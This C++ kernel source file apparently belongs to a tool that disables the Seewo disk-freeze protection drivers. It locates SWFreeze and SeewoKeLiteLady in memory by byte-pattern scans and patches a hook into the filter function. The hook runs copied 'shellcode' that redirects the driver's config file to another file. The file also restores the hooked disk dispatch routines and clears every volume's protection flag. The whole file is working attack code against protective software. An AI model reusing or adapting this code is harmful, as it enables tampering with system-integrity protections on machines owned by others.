#include "core.hpp"

WCHAR configFilePathNt[] = L"\\Device\\HarddiskVolume3\\ProgramData\\SeewoFreezeKernelConfig\\VolumeInfo.config";
WCHAR redirectFilePathNt[] = L"\\Device\\HarddiskVolume3\\ProgramData\\SeewoFreezeKernelConfig\\redirect.config";

PDRIVER_OBJECT pSWFreezeDriverObject;
PDRIVER_OBJECT pDiskDriverObject;
PDRIVER_OBJECT pSeewoKeLiteLadyDriverObject;
ULONG64 PUnhookedReadFuncAddress = 0;
ULONG64 PUnhookedWriteFuncAddress = 0;
ULONG64 PUnhookedIoControlFuncAddress = 0;
ULONG64 HookedReadFunction = 0;
ULONG64 HookedWriteFunction = 0;
ULONG64 HookedIoControlFunction = 0;

// shellcode
__declspec(noinline) EXTERN_C FLT_POSTOP_CALLBACK_STATUS PreCreateCallback(
	PFLT_CALLBACK_DATA Data,
	PFLT_RELATED_OBJECTS FltObjects,
	PVOID* CompletionContext,
	PCALLBACK_PARAMS params
)
{
	NTSTATUS status;
	PFLT_FILE_NAME_INFORMATION nameInfo;

	if (!params->isRedirect
		|| Data == NULL 
		|| Data->Iopb == NULL 
		|| Data->RequestorMode == KernelMode
		|| Data->Iopb->MajorFunction != 0x0) {
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	status = params->FltGetFileNameInformation(Data, 0x102, &nameInfo);
	if (!NT_SUCCESS(status)) {
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	params->FltParseFileNameInformation(nameInfo);
	if (nameInfo->Name.Length != sizeof(configFilePathNt) - sizeof(WCHAR)) {
		params->FltReleaseFileNameInformation(nameInfo);
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	for (ULONG i = 0; i < nameInfo->Name.Length / sizeof(WCHAR); i++) {
		if (nameInfo->Name.Buffer[i] != params->configPath[i]) {
			return FLT_PREOP_SUCCESS_NO_CALLBACK;
		}
	}
	params->FltReleaseFileNameInformation(nameInfo);

	REPARSE_DATA_BUFFER* repBuffer = (REPARSE_DATA_BUFFER*)params->ExAllocatePool(0, sizeof(REPARSE_DATA_BUFFER) + sizeof(redirectFilePathNt));
	if (!repBuffer) {
		Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
		return FLT_PREOP_COMPLETE;
	}

	for (int i = 0; i < sizeof(REPARSE_DATA_BUFFER) + sizeof(redirectFilePathNt); i++) {
		((BYTE*)repBuffer)[i] = 0;
	}

	repBuffer->ReparseTag = IO_REPARSE_TAG_SYMLINK;
	// FIELD_OFFSET(SYMBOLIC_LINK_REPARSE_BUFFER, PathBuffer) -> 12
	repBuffer->ReparseDataLength = (USHORT)(12 + sizeof(redirectFilePathNt) - sizeof(WCHAR));
	repBuffer->Reserved = 0;
	repBuffer->SymbolicLinkReparseBuffer.SubstituteNameOffset = 0;
	repBuffer->SymbolicLinkReparseBuffer.SubstituteNameLength = (USHORT)(sizeof(redirectFilePathNt) - sizeof(WCHAR));
	repBuffer->SymbolicLinkReparseBuffer.PrintNameOffset = 0;
	repBuffer->SymbolicLinkReparseBuffer.PrintNameLength = 0;
	repBuffer->SymbolicLinkReparseBuffer.Flags = 0;

	for (int i = 0; i < sizeof(redirectFilePathNt) / sizeof(WCHAR); i++) {
		repBuffer->SymbolicLinkReparseBuffer.PathBuffer[i] = params->redirectPath[i];
	}

	Data->TagData = (PVOID)repBuffer;

	Data->IoStatus.Status = STATUS_REPARSE;
	Data->IoStatus.Information = IO_REPARSE_TAG_SYMLINK;

	return FLT_PREOP_COMPLETE;
}
__declspec(noinline) EXTERN_C int PreCreateCallbackEnd() {
	return 0;
}

VOID InstallCreateFileCallback(PVOID krnl_base, get_system_routine_t get_kroutine) {
	BYTE mov_r9[] = { 0x49, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
	BYTE jmp[] = { 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE0 };
	WCHAR swfreezeDriverName[] = L"\\Driver\\SWFreeze";
	WCHAR seewoKeLiteLadyDriverName[] = L"\\FileSystem\\SeewoKeLiteLady";
	ULONG_PTR preCreateFuncStartAddr = (ULONG_PTR)PreCreateCallback;
	ULONG_PTR preCreateFuncEndAddr = (ULONG_PTR)PreCreateCallbackEnd;
	int preCreateFuncSize = preCreateFuncEndAddr - preCreateFuncStartAddr;

	InitFunction(krnl_base, get_kroutine);
	InitFunctionForFileFilter(krnl_base, get_kroutine);

	IoDriverObjectType = (PVOID*)get_kroutine(krnl_base, "IoDriverObjectType");
	pSWFreezeDriverObject = GetDriverObjectByName(swfreezeDriverName);
	if (!pSWFreezeDriverObject) {
		Logger("[-] Failed to get SWFreeze driver object by name!\n");
		return;
	}
	pSeewoKeLiteLadyDriverObject = GetDriverObjectByName(seewoKeLiteLadyDriverName);
	if (!pSeewoKeLiteLadyDriverObject) {
		Logger("[-] Failed to get SeewoKeLiteLady driver object by name!\n");
		return;
	}

	DWORD64 seewoFltFunctionAddress = ScanPattern(pSeewoKeLiteLadyDriverObject->DriverStart, pSeewoKeLiteLadyDriverObject->DriverSize, (BYTE*)"\x4D\x8B\xF8\x48\x8B\xF2\x48\x8B\xF9\x45\x33\xED\x4C\x89", 14) - 0x2A;
	if (!(seewoFltFunctionAddress + 0x2A) || !MmIsAddressValid((PVOID)seewoFltFunctionAddress)) {
		Logger("[-] Failed to find SeewoKeLiteLady file filter function pattern address or address is invalid...\n");
		return;
	}
	Logger("[+] Found SeewoKeLiteLady file filter function pattern address -> %016llx\n", seewoFltFunctionAddress);

	if (RtlCompareMemory((PVOID)seewoFltFunctionAddress, mov_r9, 2) == 2) {
		PCALLBACK_PARAMS params = *(PCALLBACK_PARAMS*)(seewoFltFunctionAddress + 2);

		if (((PFREEZE_CONFIG)config)->volumeProtected == -1) {
			params->isRedirect = FALSE;
			Logger("[+] SeewoKeLiteLady file filter function is disabled\n");
			return;
		}

		params->isRedirect = TRUE;
		Logger("[*] SeewoKeLiteLady file filter function is already modified, skipping...\n");
		return;	
	}
	else if (((PFREEZE_CONFIG)config)->volumeProtected == -1) {
		Logger("[-] File filter not installed...\n");
		return;
	}

	PCALLBACK_PARAMS params = (PCALLBACK_PARAMS)ExAllocatePool(0, sizeof(CALLBACK_PARAMS));
	params->FltGetFileNameInformation = FltGetFileNameInformation;
	params->FltParseFileNameInformation = FltParseFileNameInformation;
	params->FltReleaseFileNameInformation = FltReleaseFileNameInformation;
	params->RtlCompareUnicodeString = RtlCompareUnicodeString;
	params->RtlCopyUnicodeString = RtlCopyUnicodeString;
	params->ExAllocatePool = ExAllocatePool;
	params->ExFreePool = ExFreePool;
	params->isRedirect = TRUE;
	RtlCopyMemory(params->configPath, configFilePathNt, sizeof(configFilePathNt));
	RtlCopyMemory(params->redirectPath, redirectFilePathNt, sizeof(redirectFilePathNt));
	*(PCALLBACK_PARAMS*)(mov_r9 + 2) = params;

	PVOID prefunc = ExAllocatePool(0, preCreateFuncSize);
	RtlCopyMemory(prefunc, (PVOID)preCreateFuncStartAddr, preCreateFuncSize);
	*(PVOID*)(jmp + 2) = prefunc;
	RtlCopyMemory(prefunc, (PVOID)preCreateFuncStartAddr, preCreateFuncSize);
	Logger("[+] Allocated shellcode for file filter function at -> 0x%p\n", prefunc);

	PMDL mdl = IoAllocateMdl((PVOID)seewoFltFunctionAddress, sizeof(jmp) + sizeof(mov_r9), FALSE, FALSE, NULL);
	if (mdl == NULL)
	{
		Logger("[-] Failed to allocate MDL for file filter function\n");
		return;
	}

	__try
	{
		MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Logger("[-] Failed to lock pages for file filter function\n");
		IoFreeMdl(mdl);
		return;
	}

	PVOID writableAddress = NULL;
	do {
		writableAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, 0, NULL, FALSE, NormalPagePriority | MdlMappingNoExecute);
		if (writableAddress == NULL) break;
		RtlCopyMemory(writableAddress, mov_r9, sizeof(mov_r9));
		writableAddress = (BYTE*)writableAddress + sizeof(mov_r9);
		RtlCopyMemory(writableAddress, jmp, sizeof(jmp));
		Logger("[+] Successfully wrote to filter function!\n");
	} while (FALSE);

	if (writableAddress != NULL) MmUnmapLockedPages(writableAddress, mdl);
	if (mdl != NULL)
	{
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
	}
	return;
}

VOID ModifyConfigByMjFunc(PVOID krnl_base, get_system_routine_t get_kroutine) {
	PVOID DriverBase;
	SIZE_T DriverSize;
	DWORD64 Address = 0;
	WCHAR swfreezeDriverName[] = L"\\Driver\\SWFreeze";
	WCHAR diskDriverName[] = L"\\Driver\\Disk";

	InitFunction(krnl_base, get_kroutine);
	IoDriverObjectType = (PVOID*)get_kroutine(krnl_base, "IoDriverObjectType");

	Logger("[*] Starting to recover major function...\n");

	pSWFreezeDriverObject = GetDriverObjectByName(swfreezeDriverName);
	if (!MmIsAddressValid(pSWFreezeDriverObject)) {
		Logger("[-] Failed to get SWFreeze driver object by name or driver object is invalid!\n");
		return;
	}

	pDiskDriverObject = GetDriverObjectByName(diskDriverName);
	if (!MmIsAddressValid(pDiskDriverObject)) {
		Logger("[-] Failed to get disk driver object by name or driver object is invalid!\n");
		return;
	}

	Logger("[*] SWFreeze driver object -> 0x%p\n", pSWFreezeDriverObject);
	Logger("[*] Disk driver object -> 0x%p\n", pDiskDriverObject);

	HookedReadFunction = (ULONG64)pDiskDriverObject->MajorFunction[3];
	HookedWriteFunction = (ULONG64)pDiskDriverObject->MajorFunction[4];
	HookedIoControlFunction = (ULONG64)pDiskDriverObject->MajorFunction[14];

	DriverBase = pSWFreezeDriverObject->DriverStart;
	DriverSize = pSWFreezeDriverObject->DriverSize;
	Logger("[*] SWFreeze driver base -> 0x%016llx, SWFreeze driver size -> 0x%016llx\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x48\x8B\xC1\x48\x87", 5);
	PUnhookedReadFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0xD) + 0x11 : 0;
	PUnhookedWriteFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0x26) + 0x2A : 0;
	PUnhookedIoControlFuncAddress = Address ? Address + *(INT32*)((BYTE*)Address + 0x3B) + 0x3F : 0;

	if (!PUnhookedReadFuncAddress or !MmIsAddressValid((PVOID)PUnhookedReadFuncAddress)) {
		Logger("[-] Failed to find unhooked read dispatch function pattern address or address is invalid...\n");
		return;
	}

	if (!PUnhookedWriteFuncAddress or !MmIsAddressValid((PVOID)PUnhookedWriteFuncAddress)) {
		Logger("[-] Failed to find unhooked write dispatch function pattern address or address is invalid...\n");
		return;
	}

	if (!PUnhookedIoControlFuncAddress or !MmIsAddressValid((PVOID)PUnhookedIoControlFuncAddress)) {
		Logger("[-] Failed to find unhooked io control dispatch function pattern address or address is invalid...\n");
		return;
	}

	Logger("[+] Found unhooked read dispatch function pattern address -> %016llx\n", PUnhookedReadFuncAddress);
	Logger("[+] Found unhooked write dispatch function pattern address -> %016llx\n", PUnhookedWriteFuncAddress);
	Logger("[+] Found unhooked io control dispatch function pattern address -> %016llx\n", PUnhookedIoControlFuncAddress);

	if (*(PVOID*)PUnhookedWriteFuncAddress) {
		pDiskDriverObject->MajorFunction[3] = *(PVOID*)PUnhookedReadFuncAddress;
		pDiskDriverObject->MajorFunction[4] = *(PVOID*)PUnhookedWriteFuncAddress;
		pDiskDriverObject->MajorFunction[14] = *(PVOID*)PUnhookedIoControlFuncAddress;
		Logger("[+] Successfully restored original dispatch functions for read/write/io control!\n");
	}
	else {
		Logger("[+] No recovery required.\n");
	}
}

VOID ModifyConfigByWhiteList(PVOID krnl_base, get_system_routine_t get_kroutine) {
	NTSTATUS status;
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	Logger("[*] Starting to recover major function...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return;
	}
	Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);

	INT32 offset = *(INT32*)(Address - 0x4);
	PVolumeInfo pVolumeInfo = (PVolumeInfo)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		Logger("[-] Invalid volume info table address.\n");
		return;
	}

	VolumeInfo volumeCInfo = pVolumeInfo[2];
	volumeCInfo.whiteListItemCount = 1;
	volumeCInfo.itemStartSectorList[0] = startSector;
	volumeCInfo.itemSectorOffsetList[0] = byteOffset;

	Logger("[*] Start sector: %llu\n", volumeCInfo.itemStartSectorList[0]);
	Logger("[*] Sector count: %llu\n", volumeCInfo.itemSectorOffsetList[0]);

	Logger("[+] Successfully modified white list in memory!\n");
}

VOID ModifyConfigByWhiteListEx(PVOID krnl_base, get_system_routine_t get_kroutine) {
	NTSTATUS status;
	PVOID DriverBase;
	SIZE_T DriverSize;
	ULONG64 Address = 0;

	InitFunction(krnl_base, get_kroutine);
	Logger("[*] Starting to recover major function...\n");

	if (!GetDriverBaseAndSize("SWFreeze.sys", &DriverBase, &DriverSize)) {
		Logger("[-] Failed to get SWFreeze driver base and size!\n");
		return;
	}
	Logger("[*] SWFreeze driver base -> 0x%p, SWFreeze driver size -> 0x%p\n", DriverBase, DriverSize);

	Address = ScanPattern(DriverBase, DriverSize, (BYTE*)"\x41\x8B\xF4\xBF", 4);
	INT32 offset = *(INT32*)(Address - 0x4);
	PVolumeInfo pVolumeInfo = (PVolumeInfo)(Address + offset);

	if (!MmIsAddressValid((PVOID)pVolumeInfo)) {
		Logger("[-] Invalid volume info table address.\n");
		return;
	}

	for (int i = 0; i < 26; i++) {
		if (pVolumeInfo[i].isProtected == 1) {
			pVolumeInfo[i].isProtected = 0;
			Logger("[*] Disable drive %c protection.\n", pVolumeInfo[i].name);
		}
	}

	Logger("[+] Successfully disabled all protections!\n");
}